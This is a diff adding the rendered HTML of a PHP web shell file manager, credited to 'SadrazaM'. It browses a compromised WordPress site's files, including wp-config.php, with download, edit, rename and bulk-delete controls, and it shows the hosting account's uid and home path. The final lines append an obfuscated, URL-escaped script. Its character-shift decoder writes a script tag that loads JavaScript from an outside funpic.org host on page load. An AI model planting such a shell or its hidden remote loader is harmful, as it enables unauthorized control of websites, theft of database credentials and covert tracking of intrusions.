+<td><a href="wp-config-sample.php" target="_blank">wp-config-sample.php</a></td>
+<td nowrap>2010-11-01 09:45:11</td>
+<td nowrap>3.1 K</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-config-sample.php');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-config-sample.php');">-rwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap>
+<a href="javascript:dofile('downfile','/home3/laginha/public_html/wp-config-sample.php');">Down</a> | 
+<a href="javascript:copyfile('/home3/laginha/public_html/wp-config-sample.php');">Copy</a> | 
+<a href="javascript:opfile('editfile','/home3/laginha/public_html/wp-config-sample.php','/home3/laginha/public_html/');">Edit</a> | 
+<a href="javascript:rename('/home3/laginha/public_html/wp-config-sample.php');">Rename</a> | 
+<a href="javascript:opfile('newtime','/home3/laginha/public_html/wp-config-sample.php','/home3/laginha/public_html/');">Time</a>
+</td></tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><input type="checkbox" value="1" name="dl[/home3/laginha/public_html/wp-config.php]"></td>
+<td><a href="wp-config.php" target="_blank">wp-config.php</a></td>
+<td nowrap>2013-05-25 06:08:13</td>
+<td nowrap>3.53 K</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-config.php');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-config.php');">-rwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap>
+<a href="javascript:dofile('downfile','/home3/laginha/public_html/wp-config.php');">Down</a> | 
+<a href="javascript:copyfile('/home3/laginha/public_html/wp-config.php');">Copy</a> | 
+<a href="javascript:opfile('editfile','/home3/laginha/public_html/wp-config.php','/home3/laginha/public_html/');">Edit</a> | 
+<a href="javascript:rename('/home3/laginha/public_html/wp-config.php');">Rename</a> | 
+<a href="javascript:opfile('newtime','/home3/laginha/public_html/wp-config.php','/home3/laginha/public_html/');">Time</a>
+</td></tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><input type="checkbox" value="1" name="dl[/home3/laginha/public_html/wp-cron.php]"></td>
+<td><a href="wp-cron.php" target="_blank">wp-cron.php</a></td>
+<td nowrap>2012-09-23 11:57:21</td>
+<td nowrap>2.65 K</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-cron.php');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-cron.php');">-rwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap>
+<a href="javascript:dofile('downfile','/home3/laginha/public_html/wp-cron.php');">Down</a> | 
+<a href="javascript:copyfile('/home3/laginha/public_html/wp-cron.php');">Copy</a> | 
+<a href="javascript:opfile('editfile','/home3/laginha/public_html/wp-cron.php','/home3/laginha/public_html/');">Edit</a> | 
+<a href="javascript:rename('/home3/laginha/public_html/wp-cron.php');">Rename</a> | 
+<a href="javascript:opfile('newtime','/home3/laginha/public_html/wp-cron.php','/home3/laginha/public_html/');">Time</a>
+</td></tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><input type="checkbox" value="1" name="dl[/home3/laginha/public_html/wp-links-opml.php]"></td>
+<td><a href="wp-links-opml.php" target="_blank">wp-links-opml.php</a></td>
+<td nowrap>2010-10-23 07:17:33</td>
+<td nowrap>1.95 K</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-links-opml.php');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-links-opml.php');">-rwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap>
+<a href="javascript:dofile('downfile','/home3/laginha/public_html/wp-links-opml.php');">Down</a> | 
+<a href="javascript:copyfile('/home3/laginha/public_html/wp-links-opml.php');">Copy</a> | 
+<a href="javascript:opfile('editfile','/home3/laginha/public_html/wp-links-opml.php','/home3/laginha/public_html/');">Edit</a> | 
+<a href="javascript:rename('/home3/laginha/public_html/wp-links-opml.php');">Rename</a> | 
+<a href="javascript:opfile('newtime','/home3/laginha/public_html/wp-links-opml.php','/home3/laginha/public_html/');">Time</a>
+</td></tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><input type="checkbox" value="1" name="dl[/home3/laginha/public_html/wp-load.php]"></td>
+<td><a href="wp-load.php" target="_blank">wp-load.php</a></td>
+<td nowrap>2012-10-26 14:40:39</td>
+<td nowrap>2.35 K</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-load.php');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-load.php');">-rwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap>
+<a href="javascript:dofile('downfile','/home3/laginha/public_html/wp-load.php');">Down</a> | 
+<a href="javascript:copyfile('/home3/laginha/public_html/wp-load.php');">Copy</a> | 
+<a href="javascript:opfile('editfile','/home3/laginha/public_html/wp-load.php','/home3/laginha/public_html/');">Edit</a> | 
+<a href="javascript:rename('/home3/laginha/public_html/wp-load.php');">Rename</a> | 
+<a href="javascript:opfile('newtime','/home3/laginha/public_html/wp-load.php','/home3/laginha/public_html/');">Time</a>
+</td></tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><input type="checkbox" value="1" name="dl[/home3/laginha/public_html/wp-login.php]"></td>
+<td><a href="wp-login.php" target="_blank">wp-login.php</a></td>
+<td nowrap>2012-11-30 07:40:59</td>
+<td nowrap>28.62 K</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-login.php');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-login.php');">-rwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap>
+<a href="javascript:dofile('downfile','/home3/laginha/public_html/wp-login.php');">Down</a> | 
+<a href="javascript:copyfile('/home3/laginha/public_html/wp-login.php');">Copy</a> | 
+<a href="javascript:opfile('editfile','/home3/laginha/public_html/wp-login.php','/home3/laginha/public_html/');">Edit</a> | 
+<a href="javascript:rename('/home3/laginha/public_html/wp-login.php');">Rename</a> | 
+<a href="javascript:opfile('newtime','/home3/laginha/public_html/wp-login.php','/home3/laginha/public_html/');">Time</a>
+</td></tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><input type="checkbox" value="1" name="dl[/home3/laginha/public_html/wp-mail.php]"></td>
+<td><a href="wp-mail.php" target="_blank">wp-mail.php</a></td>
+<td nowrap>2012-09-25 00:26:19</td>
+<td nowrap>7.54 K</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-mail.php');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-mail.php');">-rwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap>
+<a href="javascript:dofile('downfile','/home3/laginha/public_html/wp-mail.php');">Down</a> | 
+<a href="javascript:copyfile('/home3/laginha/public_html/wp-mail.php');">Copy</a> | 
+<a href="javascript:opfile('editfile','/home3/laginha/public_html/wp-mail.php','/home3/laginha/public_html/');">Edit</a> | 
+<a href="javascript:rename('/home3/laginha/public_html/wp-mail.php');">Rename</a> | 
+<a href="javascript:opfile('newtime','/home3/laginha/public_html/wp-mail.php','/home3/laginha/public_html/');">Time</a>
+</td></tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><input type="checkbox" value="1" name="dl[/home3/laginha/public_html/wp-settings.php]"></td>
+<td><a href="wp-settings.php" target="_blank">wp-settings.php</a></td>
+<td nowrap>2012-11-22 03:52:16</td>
+<td nowrap>9.67 K</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-settings.php');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-settings.php');">-rwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap>
+<a href="javascript:dofile('downfile','/home3/laginha/public_html/wp-settings.php');">Down</a> | 
+<a href="javascript:copyfile('/home3/laginha/public_html/wp-settings.php');">Copy</a> | 
+<a href="javascript:opfile('editfile','/home3/laginha/public_html/wp-settings.php','/home3/laginha/public_html/');">Edit</a> | 
+<a href="javascript:rename('/home3/laginha/public_html/wp-settings.php');">Rename</a> | 
+<a href="javascript:opfile('newtime','/home3/laginha/public_html/wp-settings.php','/home3/laginha/public_html/');">Time</a>
+</td></tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><input type="checkbox" value="1" name="dl[/home3/laginha/public_html/wp-signup.php]"></td>
+<td><a href="wp-signup.php" target="_blank">wp-signup.php</a></td>
+<td nowrap>2012-09-11 07:27:25</td>
+<td nowrap>17.79 K</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-signup.php');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-signup.php');">-rwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap>
+<a href="javascript:dofile('downfile','/home3/laginha/public_html/wp-signup.php');">Down</a> | 
+<a href="javascript:copyfile('/home3/laginha/public_html/wp-signup.php');">Copy</a> | 
+<a href="javascript:opfile('editfile','/home3/laginha/public_html/wp-signup.php','/home3/laginha/public_html/');">Edit</a> | 
+<a href="javascript:rename('/home3/laginha/public_html/wp-signup.php');">Rename</a> | 
+<a href="javascript:opfile('newtime','/home3/laginha/public_html/wp-signup.php','/home3/laginha/public_html/');">Time</a>
+</td></tr>
+<tr class="alt1" onmouseover="this.className='focus';" onmouseout="this.className='alt1';">
+<td width="2%" nowrap><input type="checkbox" value="1" name="dl[/home3/laginha/public_html/wp-trackback.php]"></td>
+<td><a href="wp-trackback.php" target="_blank">wp-trackback.php</a></td>
+<td nowrap>2012-01-08 11:01:11</td>
+<td nowrap>3.61 K</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-trackback.php');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/wp-trackback.php');">-rwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap>
+<a href="javascript:dofile('downfile','/home3/laginha/public_html/wp-trackback.php');">Down</a> | 
+<a href="javascript:copyfile('/home3/laginha/public_html/wp-trackback.php');">Copy</a> | 
+<a href="javascript:opfile('editfile','/home3/laginha/public_html/wp-trackback.php','/home3/laginha/public_html/');">Edit</a> | 
+<a href="javascript:rename('/home3/laginha/public_html/wp-trackback.php');">Rename</a> | 
+<a href="javascript:opfile('newtime','/home3/laginha/public_html/wp-trackback.php','/home3/laginha/public_html/');">Time</a>
+</td></tr>
+<tr class="alt2" onmouseover="this.className='focus';" onmouseout="this.className='alt2';">
+<td width="2%" nowrap><input type="checkbox" value="1" name="dl[/home3/laginha/public_html/xmlrpc.php]"></td>
+<td><a href="xmlrpc.php" target="_blank">xmlrpc.php</a></td>
+<td nowrap>2012-09-11 15:11:39</td>
+<td nowrap>2.66 K</td>
+<td nowrap>
+<a href="javascript:fileperm('/home3/laginha/public_html/xmlrpc.php');">0755</a> / 
+<a href="javascript:fileperm('/home3/laginha/public_html/xmlrpc.php');">-rwxr-xr-x</a> / <a href="#" title="User: laginha&#13&#10Passwd: x&#13&#10Uid: 33037&#13&#10gid: 33039&#13&#10Gecos: &#13&#10Dir: /home3/laginha&#13&#10Shell: /usr/local/cpanel/bin/noshell">laginha</a></td>
+<td nowrap>
+<a href="javascript:dofile('downfile','/home3/laginha/public_html/xmlrpc.php');">Down</a> | 
+<a href="javascript:copyfile('/home3/laginha/public_html/xmlrpc.php');">Copy</a> | 
+<a href="javascript:opfile('editfile','/home3/laginha/public_html/xmlrpc.php','/home3/laginha/public_html/');">Edit</a> | 
+<a href="javascript:rename('/home3/laginha/public_html/xmlrpc.php');">Rename</a> | 
+<a href="javascript:opfile('newtime','/home3/laginha/public_html/xmlrpc.php','/home3/laginha/public_html/');">Time</a>
+</td></tr>
+<tr class="alt1"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td><a href="javascript:dofile('downrar');">Packing download selected</a> - <a href="javascript:dofile('delfiles');">Delete selected</a></td><td colspan="4" align="right">35 directories / 24 files</td></tr>
+</form></table>
+</td></tr></table>
+<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">
+	<span style="float:right;">Processed in 0.005938 second(s)</span>
+	Copyright (C) 2000-2010 <a href="http://www.sadrazam.tk" target="_blank">SadrazaM</a> All Rights Reserved.
+</div>
+</body>
+</html>
+
+<script language=javascript>document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%66%75%6E%63%74%69%6F%6E%20%64%46%28%73%29%7B%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%7D%3C%2F%73%63%72%69%70%74%3E'));dF('*8HXHWNUY*75XWH*8Imyyu*8F44onst3on3kzsunh3twl4qv4xjhzwny%7E3ox*8J*8H4XHWNUY*8J5')</script>
